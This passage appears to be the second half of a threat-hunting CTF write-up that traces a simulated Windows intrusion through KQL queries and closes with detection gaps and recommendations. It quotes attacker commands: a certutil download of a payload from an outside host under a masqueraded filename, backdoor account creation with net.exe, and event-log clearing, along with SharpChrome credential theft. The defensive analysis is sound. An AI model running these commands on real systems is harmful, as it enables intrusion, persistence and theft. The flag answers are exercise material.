+| 2026-01-15T04:56:52.1863624Z | as-srv | as.srv.administrator | Payload staged as RuntimeBroker.exe |
+
+**Key command-line artifact:**
+```
+certutil.exe -urlcache -split -f https://sync.cloud-endpoint.net/Daniel_Richardson_CV.pdf.exe C:\Users\Public\RuntimeBroker.exe
+```
+
+This shows the original payload being written to disk under a renamed filename.
+
+---
+
+### 🧠 Query
+```kql
+let start = datetime(2026-01-15);
+let end   = datetime(2026-02-23);
+DeviceProcessEvents
+| where Timestamp between (start .. end)
+| where ProcessCommandLine has "Users\\Public\\RuntimeBroker.exe"
+| project Timestamp, DeviceName, AccountName, ProcessCommandLine
+```
+
+</details>
+
+---
+
+<details>
+<summary><strong>🚩 Flag 30: Persistence Payload Hash (RuntimeBroker Masquerade)</strong></summary>
+
+### 🎯 Objective  
+Identify the SHA256 hash associated with the persistence payload deployed by the attacker.
+
+---
+
+### 📌 Finding  
+After identifying scheduled task persistence using a masqueraded binary (`RuntimeBroker.exe` staged in `C:\Users\Public`), analysis pivoted to extracting the cryptographic fingerprint of the payload.  
+
+Process telemetry was scoped to confirmed compromised hosts and filtered for execution artifacts referencing the renamed persistence binary. Aggregated execution metadata revealed consistent hashes tied to the payload across multiple hosts, confirming reuse of the same staged persistence artifact.
+
+---
+
+### 🔍 Evidence
+
+| Field | Value |
+|------|------|
+| First Seen (UTC) | 2026-01-15 04:52:22 |
+| Hosts Observed | as-pc2, as-srv |
+| Payload Path | C:\Users\Public\RuntimeBroker.exe |
+| Hash Type | SHA256 |
+| Observed Hashes | 2327e073dcf25ae03dc851ea0f3414980d3168fa959f42c5f77be1381ae6c41d<br>fd1670b43e2d9188b12b233780bf043c5a90a67a2c6e3fcdc564a5c246531bc2<br>da603fa720ab43aa6d4d36aa9fdb828dab9645523eabaac209af6451d5b4d757<br>98d63f0f44c8afaf1a4b11e38e92f81add7f59fd1ff7b296fc3d40c7f0094177<br>812ccfa2d234ef9989e1730976dd8217d0f3107fbd92244454a5fb735051b8db |
+
+---
+
+### 🧠 Query
+```kql
+let start = datetime(2026-01-15);
+let end   = datetime(2026-02-23);
+DeviceProcessEvents
+| where Timestamp between (start .. end)
+| where DeviceName in ("as-pc1","as-pc2","as-srv")
+| where ProcessCommandLine has "Users\\Public\\RuntimeBroker.exe"
+| summarize
+    FirstSeen=min(Timestamp),
+    Hosts=make_set(DeviceName),
+    Hashes=make_set(SHA256)
+```
+
+</details>
+
+---
+
+<details>
+<summary><strong>🚩 Flag 31: Backdoor Account (Local Account Creation for Persistence)</strong></summary>
+
+### 🎯 Objective  
+Identify the newly created local account used by the attacker to maintain persistent access.
+
+---
+
+### 📌 Finding  
+Process telemetry revealed execution of the Windows account management utility `net.exe` with parameters consistent with local user creation. The observed command showed explicit account creation using the `/add` parameter, confirming the creation of a new local persistence account.
+
+The command observed:
+`net.exe user svc_backup ********** /add`
+
+This confirms the attacker created a new local account designed to blend in with legitimate service-style naming conventions.
+
+---
+
+### 🔍 Evidence
+
+| Field | Value |
+|------|------|
+| Timestamp (UTC) | 2026-01-15T04:57:47.0153078Z |
+| DeviceName | as-pc1 |
+| Executing User | sophie.turner |
+| Command | net.exe user svc_backup ********** /add |
+
+---
+
+### 🧠 Query
+```kql
+let start = datetime(2026-01-15);
+let end   = datetime(2026-02-23);
+DeviceProcessEvents
+| where Timestamp between (start .. end)
+| where DeviceName in ("as-pc1","as-pc2","as-srv")
+| where FileName =~ "net.exe"
+| where ProcessCommandLine has "user"
+| where ProcessCommandLine has_any ("/add", "add ")
+| project Timestamp, DeviceName, AccountName, ProcessCommandLine
+| order by Timestamp asc
+```
+
+</details>
+
+---
+
+<details>
+<summary><strong>🚩 Flag 32: Sensitive Document (Pre-Exfiltration Target Identification)</strong></summary>
+
+### 🎯 Objective  
+Identify the sensitive document accessed by the attacker on the file server.
+
+---
+
+### 📌 Finding  
+File activity telemetry on the file server (**as-srv**) revealed multiple document interactions under shared directories. To avoid post-impact artifacts (e.g., ransomware-encrypted files), analysis focused on indicators of genuine user interaction such as editor lock files and rename patterns.
+
+Among the observed files, one document showed strong signals of active access including LibreOffice lock artifacts and modification sequences prior to staging activity.
+
+The identified sensitive document:  
+**BACS_Payments_Dec2025.ods**
+
+Supporting telemetry included editor lock artifacts:  
+`.~lock.BACS_Payments_Dec2025.ods#`
+
+These lock files are generated only when a document is actively opened, confirming pre-exfiltration access rather than post-impact encryption.
+
+---
+
+### 🔍 Evidence
+
+| Field | Value |
+|------|------|
+| Host | as-srv |
+| Lock Artifact | .~lock.BACS_Payments_Dec2025.ods# |
+| First Seen (UTC) | 2026-01-15T04:44:06.0147429Z |
+| Last Seen (UTC) | 2026-01-15T04:47:33.8665892Z |
+| File Type | LibreOffice Spreadsheet (.ods) |
+
+---
+
+### 🧠 Query
+```kql
+let start=datetime(2026-01-15);
+let end=datetime(2026-02-23);
+DeviceFileEvents
+| where Timestamp between (start..end)
+| where DeviceName == "as-srv"
+| where FolderPath startswith @"C:\Shares\"
+| where FileName has_any (".pdf",".docx",".xlsx",".csv",".pptx",".txt",".ods",".zip",".7z",".rar",".akira")
+| summarize Hits=count(), FirstSeen=min(Timestamp), LastSeen=max(Timestamp), Actions=make_set(ActionType,20) by FileName
+| order by Hits desc, FirstSeen asc
+```
+
+</details>
+
+---
+
+<details>
+<summary><strong>🚩 Flag 33: Modification Evidence (Editing Artifact Identification)</strong></summary>
+
+### 🎯 Objective  
+Identify the file artifact proving the sensitive document was opened for editing rather than passive viewing.
+
+---
+
+### 📌 Finding  
+Following identification of the sensitive financial document on the file server (**as-srv**), analysis pivoted to determining whether the file was actively edited or simply accessed.
+
+File telemetry revealed the presence of a LibreOffice editing lock artifact associated with the document. LibreOffice generates lock files prefixed with `.~lock.` and suffixed with `#` whenever a document is opened for editing.
+
+The artifact identified:  
+**.~lock.BACS_Payments_Dec2025.ods#**
+
+Because lock files are only generated during active editing sessions, their presence provides strong forensic evidence that the attacker opened the document in an editor rather than passively viewing or copying it.
+
+---
+
+### 🔍 Evidence
+
+| Field | Value |
+|------|------|
+| Host | as-srv |
+| FolderPath | C:\Shares\Payroll\.~lock.BACS_Payments_Dec2025.ods# |
+| ActionType | FileCreated |
+| Timestamp (UTC) | 2026-01-15T04:46:23.549337Z |
+| Initiating Process | ntoskrnl.exe (system-level file creation) |
+
+---
+
+### 🧠 Query
+```kql
+let start=datetime(2026-01-15);
+let end=datetime(2026-02-23);
+DeviceFileEvents
+| where Timestamp between (start..end)
+| where DeviceName == "as-srv"
+| where FolderPath startswith @"C:\Shares\"
+| where FileName startswith ".~lock."
+| project Timestamp,
+         DeviceName,
+         FileName,
+         FolderPath,
+         ActionType,
+         InitiatingProcessAccountName,
+         InitiatingProcessFileName
+| order by Timestamp asc
+```
+
+</details>
+
+---
+
+<details>
+<summary><strong>🚩 Flag 34: Access Origin (Workstation Attribution via SMB Telemetry)</strong></summary>
+
+### 🎯 Objective  
+Identify the workstation from which the sensitive document was accessed on the file server.
+
+---
+
+### 📌 Finding  
+Following confirmation that the sensitive financial document was accessed and edited on the file server (**as-srv**), analysis pivoted to determining the true origin of the interaction.
+
+Server-side file telemetry identified document access but only showed system-level handling processes, which is expected for SMB file operations. To determine the originating client, the investigation pivoted to SMB network telemetry during the document editing timeframe.
+
+By analyzing SMB traffic (port 445) during the window surrounding the editing lock artifact, a single workstation was observed initiating file share connections to the server.
+
+The originating workstation identified:  
+**as-pc2**
+
+This system established SMB sessions to the file server at the same time the editing lock file was created, indicating it was the endpoint used to access and modify the sensitive document.
+
+---
+
+### 🔍 Evidence
+
+| Field | Value |
+|------|------|
+| Timestamp (UTC) | 2026-01-27T18:47:05.9221979Z |
+| Source Device | as-pc2 |
+| Destination | as-srv |
+| RemoteIP | 10.1.0.203 |
+| Protocol | SMB (Port 445) |
+| Initiating Process | ntoskrnl.exe (system SMB handler) |
+
+---
+
+### 🧠 Query
+```kql
+let start=datetime(2026-01-15 04:40:00);
+let end=datetime(2026-01-27 04:50:00);
+DeviceNetworkEvents
+| where Timestamp between (start..end)
+| where RemotePort == 445
+| where RemoteIP contains "as-srv" or RemoteUrl contains "as-srv"
+| project Timestamp,
+         DeviceName,
+         InitiatingProcessAccountName,
+         InitiatingProcessFileName,
+         RemoteIP,
+         RemoteUrl
+| order by Timestamp asc
+```
+
+</details>
+
+---
+
+<details>
+<summary><strong>🚩 Flag 35: Exfil Archive (Pre-Exfiltration Packaging)</strong></summary>
+
+### 🎯 Objective  
+Identify the archive file created to stage data prior to exfiltration.
+
+---
+
+### 📌 Finding  
+After confirming access and editing of a sensitive financial document on the file server (**as-srv**), analysis pivoted to identifying data staging behavior. Attackers commonly compress collected data into archives prior to exfiltration to reduce size, enable encryption, and simplify transfer.
+
+File telemetry on the file server was analyzed for compressed archive formats commonly associated with staging activity (e.g., `.7z`, `.zip`, `.rar`). This surfaced the creation of a compressed archive shortly after sensitive document interaction.
+
+The archive identified:  
+**Shares.7z**
+
+The archive appeared immediately after document interaction and was later moved within the shared directory structure, indicating intentional staging and organization prior to exfiltration.
+
+---
+
+### 🔍 Evidence
+
+| Timestamp (UTC) | FileName | Path | Action |
+|----------------|----------|------|--------|
+| 2026-01-15T04:59:04.9120277Z | Shares.7z | C:\Shares.7z | FileCreated |
+| 2026-01-15T04:59:47.9246654Z | Shares.7z | C:\Shares\Clients\Shares.7z | FileRenamed |
+
+This rename sequence indicates active handling and staging of the archive within shared directories.
+
+---
+
+### 🧠 Query
+```kql
+let start=datetime(2026-01-15);
+let end=datetime(2026-02-23);
+DeviceFileEvents
+| where Timestamp between (start..end)
+| where DeviceName == "as-srv"
+| where FileName endswith ".7z"
+| project Timestamp, FileName, FolderPath, ActionType
+| order by Timestamp asc
+```
+
+</details>
+
+---
+
+<details>
+<summary><strong>🚩 Flag 36: Archive Hash (Staged Data Integrity)</strong></summary>
+
+### 🎯 Objective  
+Identify the SHA256 hash of the archive used to stage data prior to exfiltration.
+
+---
+
+### 📌 Finding  
+After identifying the staged archive (**Shares.7z**) on the file server (**as-srv**), analysis pivoted to extracting the cryptographic fingerprint of the archive directly from endpoint telemetry.
+
+Initial results surfaced hashes tied to compression utilities (e.g., 7z binaries), which were excluded as tooling artifacts. The investigation was refined to isolate file telemetry explicitly referencing the archive itself while retaining only entries containing a valid SHA256 value.
+
+This approach ensured the recovered hash represented the staged data artifact rather than the compression utility used to generate it.
+
+---
+
+### 🔍 Evidence
+
+| Field | Value |
+|------|------|
+| First Seen (UTC) | 2026-01-15T04:59:04.9120277Z |
+| Host | as-srv |
+| FileName | Shares.7z |
+| SHA256 | 6886c0a2e59792e69df94d2cf6ae62c2364fda50a23ab44317548895020ab048 |
+
+This hash uniquely identifies the archive used to bundle collected data prior to exfiltration.
+
+---
+
+### 🧠 Query
+```kql
+let start=datetime(2026-01-15);
+let end=datetime(2026-02-23);
+DeviceFileEvents
+| where Timestamp between (start..end)
+| where DeviceName == "as-srv"
+| where FileName =~ "Shares.7z"
+| project Timestamp,
+         DeviceName,
+         FileName,
+         FolderPath,
+         SHA256,
+         ActionType
+| where isnotempty(SHA256)
+| summarize FirstSeen=min(Timestamp), Hash=any(SHA256)
+```
+
+</details>
+
+---
+
+<details>
+<summary><strong>🚩 Flag 37: Log Clearing (Defense Evasion via Event Log Tampering)</strong></summary>
+
+### 🎯 Objective  
+Identify which Windows event logs were cleared by the attacker to evade detection.
+
+---
+
+### 📌 Finding  
+Following confirmation of initial compromise activity on **as-pc1**, analysis pivoted to identifying defense evasion behaviors occurring immediately after payload execution.
+
+Process telemetry revealed repeated execution of the native Windows utility **wevtutil.exe**, which is commonly abused by attackers to remove forensic artifacts by clearing Windows event logs.
+
+Command-line parsing of execution artifacts revealed explicit log clearing commands targeting multiple core Windows event logs. These commands were executed within minutes of initial payload activity, strongly indicating deliberate anti-forensics behavior.
+
+---
+
+### 🔍 Evidence
+
+| Field | Value |
+|------|------|
+| Host | as-pc1 |
+| Time Window | 2026-01-15 05:05–05:15 UTC |
+| Utility Used | wevtutil.exe |
+| Cleared Logs | System, Security, Application |
+
+**Aggregated telemetry output:**
+```
+DeviceName: as-pc1  
+ClearedLogs: ["System","Security","Application"]
+```
+
+This confirms multiple critical Windows logs were deliberately cleared during early attacker activity.
+
+---
+
+### 🧠 Query
+```kql
+let start=datetime(2026-01-15 05:05:00);
+let end=datetime(2026-01-15 05:15:00);
+DeviceProcessEvents
+| where Timestamp between (start..end)
+| where DeviceName =~ "as-pc1"
+| where FileName =~ "wevtutil.exe"
+| where ProcessCommandLine has_any (" cl ","clear-log")
+| extend ClearedLog = extract(@"(?i)\bcl\s+([A-Za-z0-9\-\/]+)", 1, ProcessCommandLine)
+| where isnotempty(ClearedLog)
+| summarize ClearedLogs=make_set(ClearedLog) by DeviceName
+```
+
+</details>
+
+---
+
+<details>
+<summary><strong>🚩 Flag 38: Reflective Loading (In-Memory Code Execution)</strong></summary>
+
+### 🎯 Objective  
+Identify the telemetry artifact indicating reflective code loading during the intrusion.
+
+---
+
+### 📌 Finding  
+After identifying layered attacker tradecraft including LOLBins, masquerading, and log clearing, analysis pivoted toward detecting **fileless execution techniques** across compromised hosts.
+
+Defender Advanced Hunting telemetry revealed repeated events with the ActionType:
+
+**ClrUnbackedModuleLoaded**
+
+This event indicates that a managed (.NET) assembly was loaded directly into memory without an associated file on disk — a hallmark of reflective loading and fileless malware execution.
+
+Multiple occurrences were observed across compromised hosts, with metadata indicating in-memory module loading from native processes such as PowerShell and Notepad.
+
+Notably, one event contained module metadata referencing:
+
+**SharpChrome**
+
+This strongly indicates in-memory execution of offensive tooling via reflective loading.
+
+---
+
+### 🔍 Evidence
+
+| Field | Value |
+|------|------|
+| ActionType | ClrUnbackedModuleLoaded |
+| Hosts Observed | as-pc1, as-srv |
+| Example Process | powershell.exe, notepad.exe |
+| In-Memory Module | SharpChrome |
+| Execution Type | Fileless (.NET reflective loading) |
+
+**Example telemetry artifact:**
+```
+DeviceName: as-pc1  
+InitiatingProcessFileName: notepad.exe  
+ModuleILPathOrName: SharpChrome
+```
+
+This confirms unmanaged module loading without a backing file, consistent with reflective in-memory execution.
+
+---
+
+### 🧠 Query
+```kql
+let start=datetime(2026-01-15);
+let end=datetime(2026-02-23);
+DeviceEvents
+| where Timestamp between (start..end)
+| where DeviceName in~ ("as-pc1","as-pc2","as-srv")
+| where ActionType == "ClrUnbackedModuleLoaded"
+| project Timestamp, DeviceName, InitiatingProcessAccountName, InitiatingProcessFileName, InitiatingProcessCommandLine, AdditionalFields
+| order by Timestamp asc
+```
+
+</details>
+
+---
+
+<details>
+<summary><strong>🚩 Flag 39: Memory Tool (In-Memory Credential Theft)</strong></summary>
+
+### 🎯 Objective  
+Identify the credential theft tool that was loaded directly into memory during the intrusion.
+
+---
+
+### 📌 Finding  
+Following detection of reflective loading activity, analysis pivoted to identifying the **specific in-memory tooling** executed by the attacker.
+
+Reflective loading telemetry (`ClrUnbackedModuleLoaded`) was parsed to extract module metadata embedded in Defender’s AdditionalFields JSON payload. This allows identification of offensive tooling even when no executable exists on disk.
+
+Telemetry revealed a reflective loading event on **as-pc1** where an unmanaged .NET assembly was executed directly in memory. The extracted module name was:
+
+**SharpChrome**
+
+SharpChrome is a GhostPack credential theft utility used to extract browser secrets such as saved credentials, cookies, and DPAPI-protected data.
+
+The event occurred under a legitimate host process, indicating fileless execution designed to evade detection.
+
+---
+
+### 🔍 Evidence
+
+| Field | Value |
+|------|------|
+| Timestamp (UTC) | 2026-01-15T05:09:53.5714672Z |
+| Host | as-pc1 |
+| User | sophie.turner |
+| Host Process | notepad.exe |
+| In-Memory Tool | SharpChrome |
+| Execution Type | Reflective loading (fileless) |
+
+**Telemetry artifact:**
+```
+ActionType: ClrUnbackedModuleLoaded  
+Tool: SharpChrome  
+Parent Process: notepad.exe
+```
+
+This confirms unmanaged module execution directly from memory without a backing file.
+
+---
+
+### 🧠 Query
+```kql
+let start=datetime(2026-01-15);
+let end=datetime(2026-02-23);
+DeviceEvents
+| where Timestamp between (start..end)
+| where ActionType == "ClrUnbackedModuleLoaded"
+| extend Tool = tostring(parse_json(AdditionalFields).ModuleILPathOrName)
+| where Tool =~ "SharpChrome"
+| project Timestamp, DeviceName, InitiatingProcessAccountName, InitiatingProcessFileName, Tool
+| order by Timestamp asc
+```
+
+</details>
+
+---
+
+<details>
+<summary><strong>🚩 Flag 40: Host Process (Reflective Injection Target)</strong></summary>
+
+### 🎯 Objective  
+Identify the legitimate process that hosted the in-memory credential theft assembly during reflective loading.
+
+---
+
+### 📌 Finding  
+Following confirmation that the credential theft tool **SharpChrome** was executed via reflective loading, analysis pivoted to identifying the **host process** that contained the in-memory assembly.
+
+Reflective loading telemetry preserves process lineage metadata, including the process responsible for hosting unmanaged modules loaded directly into memory. Aggregation of reflective loading events associated with SharpChrome revealed a consistent hosting process.
+
+The process identified was:
+
+**notepad.exe**
+
+This indicates the attacker injected the malicious .NET assembly into a trusted Windows binary rather than executing it from a suspicious parent process. Using a benign host process is a common defense evasion technique that allows attackers to blend malicious activity into normal system behavior.
+
+This aligns with earlier telemetry showing the attacker leveraging legitimate binaries throughout the intrusion lifecycle.
+
+---
+
+### 🔍 Evidence
+
+| Field | Value |
+|------|------|
+| Reflective Tool | SharpChrome |
+| Hosting Process | notepad.exe |
+| Execution Type | In-memory reflective loading |
+| Detection Source | ClrUnbackedModuleLoaded telemetry |
+
+**Aggregated reflective loading metadata:**
+```
+Hosts: ["notepad.exe"]
+```
+
+This confirms that the in-memory credential theft assembly was hosted inside a legitimate Windows process.
+
+---
+
+### 🧠 Query
+```kql
+let start=datetime(2026-01-15);
+let end=datetime(2026-02-23);
+DeviceEvents
+| where Timestamp between (start..end)
+| where ActionType == "ClrUnbackedModuleLoaded"
+| extend Tool = tostring(parse_json(AdditionalFields).ModuleILPathOrName)
+| where Tool =~ "SharpChrome"
+| summarize Hosts=make_set(InitiatingProcessFileName)
+```
+
+</details>
+
+## 🚨 Detection Gaps & Recommendations
+
+### Observed Gaps
+
+- **LOLBin Abuse Visibility Gaps:** Native tools (certutil, net, schtasks, wmic, wevtutil) were used throughout the intrusion without detection, enabling payload delivery, persistence, and defense evasion.
+- **Unauthorized Remote Access Tooling:** AnyDesk deployment across multiple hosts was not flagged, indicating no controls for unapproved remote administration software.
+- **Credential Abuse Detection Failure:** Valid accounts were reused for lateral movement without alerts for abnormal cross-host authentication patterns.
+- **Masquerading Blind Spot:** A payload renamed as `RuntimeBroker.exe` executed from `C:\Users\Public` without detection, highlighting lack of path-based execution monitoring.
+- **Persistence Creation Visibility Gaps:** Scheduled task persistence (`MicrosoftEdgeUpdateCheck`) and local account creation (`svc_backup`) occurred without alerts.
+- **Fileless Attack Detection Weakness:** Reflective loading events (`ClrUnbackedModuleLoaded`) were present in telemetry but not operationalized into detections.
+- **Log Tampering Detection Failure:** Security and System logs were cleared using `wevtutil.exe` without triggering alerts or immutable logging protections.
+- **Data Staging Blind Spot:** Sensitive document access followed by archive creation (`Shares.7z`) was not detected, indicating missing behavioral analytics for collection activity.
+
+---
+
+### Recommendations
+
+**Immediate (0–30 days)**
+- Alert on LOLBin abuse (certutil downloads, schtasks creation, net user changes, wevtutil log clearing)
+- Detect and block unauthorized remote access tools (e.g., AnyDesk)
+- Forward logs to immutable centralized storage
+- Rotate compromised credentials and enforce MFA on privileged accounts
+
+**Short-Term (30–90 days)**
+- Deploy UEBA for lateral movement and abnormal authentication detection
+- Correlate persistence indicators (tasks, accounts, autoruns)
+- Create detections for reflective loading and GhostPack-style tooling
+- Monitor sensitive file access followed by compression activity
+
+**Long-Term (90+ days)**
+- Implement application allowlisting and zero-trust principles
+- Deploy DLP for sensitive document monitoring
+- Introduce deception artifacts (honeypot files, honey credentials)
+- Conduct adversary emulation exercises to validate detection coverage
+
+
+
 
 
 
